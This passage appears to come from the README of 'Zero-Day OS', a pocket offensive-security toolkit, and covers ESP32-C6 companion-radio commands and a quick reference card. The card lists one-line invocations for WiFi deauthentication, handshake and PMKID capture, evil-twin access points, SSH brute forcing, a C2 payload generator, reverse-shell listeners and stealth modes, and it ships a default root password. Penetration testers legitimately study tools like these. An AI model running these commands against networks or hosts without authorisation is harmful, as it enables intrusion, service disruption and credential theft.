Chip: ESP32-C6 (160MHz RISC-V, 300KB SRAM, 4MB Flash)
WiFi: 802.11ax (WiFi 6) + 802.11b/g/n 2.4GHz
BLE: 5.0
802.15.4: Zigbee 3.0 / Thread 1.3 ← unique capability
LCD: 0.96" 128x64 SSD1306-compatible

Note: C6L's unique value is Zigbee/Thread + BLE 5 (no other
device covers 802.15.4). WiFi 6 is a bonus; M5MonsterC5
is the primary WiFi attack radio.
```

```bash
c6l-ctl probe                 # Detect C6L on I2C and UART
c6l-ctl wifi scan              # WiFi 6 scan via C6L
c6l-ctl wifi deauth <BSSID> <CH>  # Deauth via WiFi 6 radio
c6l-ctl zigbee scan            # Scan Zigbee/Thread networks
c6l-ctl zigbee sniffer         # Capture Zigbee packets
c6l-ctl ble scan               # BLE 5 scan via C6L
c6l-ctl lcd text "hello"       # Display text on C6L LCD
c6l-ctl lcd status             # Show system status on C6L LCD
c6l-ctl serial                 # Open serial console to C6L
c6l-ctl flash c6l-companion    # Flash companion firmware
c6l-ctl config                  # Show configuration and wiring
```

---

## Quick Reference Card

```
╔══════════════════════════════════════════════════════════╗
║              ZERO-DAY OS  —  QUICK REFERENCE              ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  LOGIN:     root / zeroday                               ║
║  TUI:       Fn+Tab  or  cyber_launcher                   ║
║  TERMINAL:  Fn+Return (zeroday-term)                    ║
║  FILES:     zeroday-fm or fm                            ║
║  NAV:       trail-ctl start                             ║
║  GPS:       gps-ctl location                            ║
║  OLED:      oled-ctl trail                              ║
║  PANIC:     Fn+P                                         ║
║  STEALTH:   Fn+Space                                     ║
║  OPENCODE:  Fn+O                                         ║
║                                                          ║
║  WiFi scan      sudo wifi-scan wlan0                     ║
║  WiFi survey    sudo wifi-survey-log wlan0 300             ║
║  Deauth         sudo wifi-deauth wlan1 <BSSID> <CH>      ║
║  Handshake      sudo wifi-handshake wlan1 <BSSID> <CH>   ║
║  PMKID          sudo wifi-pmkid wlan1 <BSSID> <CH>       ║
║  Evil twin      sudo wifi-evil-twin wlan0 eth0 "SSID"   ║
║  Crack          sudo wifi-crack *.cap                     ║
║  MAC rotate     sudo mac-rotate wlan0 random               ║
║                                                          ║
║  Host discovery sudo net-discover eth0                   ║
║  Port scan      net-quickscan <IP> quick                  ║
║  Vuln scan      sudo net-vulnscan <IP>                   ║
║  IoT scan       iot-scan <IP/subnet> cameras              ║
║  C2 listener    quick-c2 listen 4444                      ║
║  C2 payload     quick-c2 payload bash <IP> <PORT>         ║
║  SOCKS proxy    tunnel-mgr socks <host> 1080               ║
║  Port forward   tunnel-mgr forward 8080 <rhost:rport> <ssh>║
║  DoH proxy     sudo doh-proxy start cloudflare 5353       ║
║                                                          ║
║  BT scan        sudo bt-scan                             ║
║  Bettercap      sudo bettercap -I wlan0                   ║
║  BLE remote     zeroday-ble-remote start                  ║
║  IR capture     sudo ir-scan                             ║
║  Camera snap    cam-snap                                 ║
║  Camera OCR     cam-ocr                                  ║
║                                                          ║
║  Crack hashes   john --format=raw-md5 hashes.txt          ║
║  Brute creds    hydra -l admin -P words.txt ssh://<IP>    ║
║  Web enum       gobuster dir -u http://<IP> -w common.txt ║
║                                                          ║
║  SDR scan       sudo sdr-scan 433.0-434.0 10             ║
║  RF capture      sudo rf-capture 433.92 10                ║
║  GPIO probe      sudo gpio-probe                         ║
║                                                          ║
║  Revshell       revshell-listen 4444                     ║
║  C2 payload     quick-c2 payload bash <IP> 4444           ║
║                                                          ║
║  Nav trail      trail-ctl start                           ║
║  Nav exit       trail-ctl exit                            ║
║  Nav waypoint   trail-ctl mark "exit"                    ║
║  GPS location   gps-ctl location                          ║
║  GPS waypoint   gps-ctl save "entrance"                  ║
║  GPS wardrive   gps-ctl wardrive                          ║
║  RFID2 read     rfid2-ctl read                            ║
║  RFID2 detect   rfid2-ctl detect                          ║
║  C6L scan       c6l-ctl wifi scan                         ║
║  C6L zigbee    c6l-ctl zigbee scan                       ║
║  Ext display    ext-display hdmi mirror                   ║
║  HDMI auto      (hotplug-detected, no manual setup needed) ║
║  USB keyboard   (auto-detected by 70-usb-input.rules)     ║
║  Jellyfin TV    jellyfin-tv                                ║
║  Jellyfin GUI   jellyfinmediaplayer                       ║
║  OLED status    oled-ctl trail                            ║
║  OLED text      oled-ctl text "hello"                     ║
║                                                          ║
║  Dongle         dongle-setup status                      ║
║  MonsterC5      monsterctl status                         ║
║  Meshtastic     monsterctl mesh start                      ║
║  Ragnar scan    ragnar-scan eth0 quick                    ║
║  Loot organize  loot-organize                             ║
║  Battery        cardputer-battery                        ║
║  Power mode     power-mode stealth                       ║
║  USB gadget     sudo usb-gadget-mode hid                  ║
║  OpenCode ask   opencode-ask "question"                  ║
║  Mesh setup     mesh-setup install                       ║
║                                                          ║
║  Change pass    passwd                                   ║
║  WiFi setup     cardputer-wifi-setup                     ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

---

<p align="center">
<strong>Built for the field. Designed for the edge. Fits in your wallet.</strong>
</p>